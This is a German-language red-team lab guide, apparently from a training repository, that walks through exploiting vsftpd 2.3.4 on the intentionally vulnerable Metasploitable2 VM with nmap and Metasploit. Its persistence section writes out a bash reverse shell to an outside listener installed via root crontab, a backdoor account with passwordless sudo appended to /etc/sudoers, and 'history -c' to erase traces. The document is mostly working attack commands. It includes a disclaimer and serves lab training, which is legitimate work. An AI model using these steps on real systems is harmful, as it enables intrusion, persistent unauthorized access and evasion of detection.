# 🛡️ Red Team Pentesting Routine: vsftpd Exploitation & Backdoor auf Metasploitable2

## 🔍 Ziel
1. Finde Metasploitable2 im Netzwerk, 
2. nutze eine bekannte Schwachstelle in `vsftpd v2.3.4` aus, 
3. verschaffe dir Zugriff via `msfconsole` und
4. erstelle eine persistente Backdoor für künftige Zugriffe.

---

## 🧪 Testumgebung

- **Angreifer:** Kali Linux (z. B. 192.168.1.100)
- **Zielsystem:** Metasploitable2 (IP wird ermittelt)
- **Firewall/Gateway:** pfSense (z. B. 192.168.1.1)
- **Netzbereich:** 192.168.1.0/24

---

## 1. 🧭 Netzwerkerkennung via Nmap

Scanne das Netzwerk, um das Zielsystem zu identifizieren:

```bash
sudo nmap -sP 192.168.1.0/24
```

Suche nach einem Host mit offenen Ports wie 21, 22, 23, 80 usw. – typisch für Metasploitable2.
Angenommen, du findest:
```kotlin
Nmap scan report for 192.168.1.0/24
Host is up (0.00041s latency).
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
```
Merke dir die IP, z. B. 192.168.1.102.

---

## 2. 🎯 Service-Erkennung

Jetzt gezielt den FTP-Port prüfen:

```bash
sudo nmap -sV -p21 192.168.1.102
```
Erwartete Ausgabe:
```pgsql
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```
Diese Version ist bekannt verwundbar für eine Backdoor-Shell über speziell formatierte Login-Daten.

---
## 3. 💥 Exploitation mit Metasploit

Starte Metasploit:
```bash
msfconsole
```

Lade das passende Exploit-Modul:
```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.102
set RPORT 21
exploit
```

Wenn erfolgreich, erhältst du:
```css
[*] Backdoor service has been spawned
[*] Command shell session 1 opened
```

---

## 4. 🛠️ Zugriff sichern (Backdoor persistieren)

Du hast jetzt eine Shell. Ziel: eine persistente Backdoor.

1. Prüfe zuerst den User-Kontext:
```bash
whoami
```
2. Eine einfache Methode: Erzeuge einen Reverse-Shell Bash-Skript im Autostart:
```bash
echo "bash -i >& /dev/tcp/192.168.1.101/4444 0>&1" > /tmp/bd.sh
chmod +x /tmp/bd.sh
echo "@reboot root /tmp/bd.sh" >> /etc/crontab
```
3. Starte Listener auf Kali:
```bash
nc -lvnp 4444
```

Beim nächsten Reboot von Metasploitable2 verbindet sich die Shell zu deinem Kali.

**Alternative:** Erstelle einen neuen Benutzer:
```bash
useradd redteam -m -s /bin/bash
echo 'redteam:redpass' | chpasswd
echo "redteam ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```
---

## 5. 📎 Cleanup & Hinweise

- Für realistische Tests kann history -c verwendet werden, um Spuren zu verwischen.
- Beachte: Metasploitable2 ist absichtlich verwundbar – verwende diese Methoden nicht gegen produktive Systeme.
- Dokumentiere deine Sessions mit script:
```bash
script pentest_session.log
```

---

## 🧾 Zusammenfassung der Schritte

| Schritt | Tool        | Zweck                           |
| ------- | ----------- | ------------------------------- |
| 1       | Nmap        | Netzwerkscan                    |
| 2       | Nmap        | Servicedetektion (vsftpd 2.3.4) |
| 3       | Metasploit  | Exploitation via FTP-Backdoor   |
| 4       | Netcat/Bash | Backdoor persistieren           |
| 5       | Bash        | Optional: Benutzer anlegen      |


---

## ✅ Tools benötigt

- nmap
- msfconsole (Metasploit Framework)
- netcat
- bash
- cron

## 🧠 Empfehlung

Nutze iptables oder pfSense Logging, um zu beobachten, wie Angriffe in der Firewall sichtbar werden. 
Dies ist nützlich für spätere Blue Team-Analysen.

---

## ⚠️ Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich 
der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet 
werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch 
und rechtlich korrekt handeln.

[Disclaimer](/cybersercurity/00-disclaimer/disclaimer.md)

--- 

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** Juli 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!

---